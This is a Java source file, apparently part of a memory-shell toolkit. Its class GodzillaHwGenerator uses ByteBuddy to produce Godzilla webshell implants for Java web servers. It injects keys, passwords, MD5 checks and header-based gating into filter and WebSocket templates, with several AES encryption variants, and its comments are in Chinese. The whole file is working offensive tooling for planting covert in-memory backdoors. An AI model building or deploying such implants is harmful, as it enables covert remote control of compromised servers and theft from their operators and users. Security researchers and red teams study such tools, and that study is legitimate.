package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import com.reajason.javaweb.InvalidInputException;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;
import com.reajason.javaweb.utils.DigestUtils;
import net.bytebuddy.dynamic.DynamicType;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * 按 {@link GodzillaHwConfig#getCryption()} 选择模板变体：基础模板名 + 加密器后缀。
 * <p>
 * 例如 {@code GodzillaHwFilter} + {@code JAVA_AES_RAW} 命中
 * {@code GodzillaHwFilterRaw}，该文件里只有裸 AES 协议，不包含其余四种加密器的代码。
 * <p>
 * WebSocket / RawWebSocket 只有 {@code JAVA_WEB_SOCKET_AES_RAW} 一种协议，模板只有
 * {@code key} 字段，因此不走“加密器后缀”和请求头门闩字段的注入。
 *
 * @author ReaJason
 */
public class GodzillaHwGenerator extends ByteBuddyShellGenerator<GodzillaHwConfig> {

    public GodzillaHwGenerator(ShellConfig shellConfig, GodzillaHwConfig godzillaHwConfig) {
        super(shellConfig, godzillaHwConfig);
    }

    @Override
    public DynamicType.Builder<?> getBuilder() {
        GodzillaHwCryption cryption = shellToolConfig.getCryption();
        boolean webSocket = shellConfig.getShellType().endsWith("WebSocket");
        if (webSocket != (cryption == GodzillaHwCryption.JAVA_WEB_SOCKET_AES_RAW)) {
            throw new InvalidInputException(webSocket
                    ? "WebSocket/RawWebSocket shell types require cryption JAVA_WEB_SOCKET_AES_RAW"
                    : "JAVA_WEB_SOCKET_AES_RAW can only be used with WebSocket/RawWebSocket shell types");
        }

        String templateClassName = shellToolConfig.getShellTemplateClassName();
        String suffix = cryption.getSuffix();
        if (!suffix.isEmpty() && !templateClassName.endsWith(suffix)) {
            shellToolConfig.setShellTemplateClassName(templateClassName + suffix);
        }

        String keyMd5 = DigestUtils.md5Hex(shellToolConfig.getKey()).substring(0, 16);
        DynamicType.Builder<?> builder = redefineTemplate();
        if (!webSocket) {
            builder = builder.field(named("headerName")).value(shellToolConfig.getHeaderName())
                    .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
        }

        switch (cryption) {
            case JAVA_WEB_SOCKET_AES_RAW:
                return builder.field(named("key")).value(keyMd5);
            case JAVA_AES_RAW:
                return builder.field(named("key")).value(keyMd5);
            case JAVA_AES_RAW_BASE64:
                return builder.field(named("key")).value(keyMd5)
                        .field(named("md5")).value(DigestUtils.md5Hex(keyMd5).toUpperCase());
            case JAVA_AES_BASE64_PRO:
                return builder.field(named("key")).value(keyMd5)
                        .field(named("pass"))
                        .value(DigestUtils.md5Hex(shellToolConfig.getPass()).substring(0, 16));
            case JAVA_AES_BASE64_PROFILE:
                String passMd5 = DigestUtils.md5Hex(shellToolConfig.getPass()).substring(0, 16);
                return builder.field(named("key")).value(keyMd5)
                        .field(named("pass")).value(passMd5)
                        .field(named("md5")).value(DigestUtils.md5Hex(keyMd5 + passMd5).toUpperCase());
            case JAVA_AES_BASE64:
            default:
                return builder.field(named("pass")).value(shellToolConfig.getPass())
                        .field(named("key")).value(keyMd5)
                        .field(named("md5")).value(
                                DigestUtils.md5Hex(shellToolConfig.getPass() + keyMd5).toUpperCase());
        }
    }
}
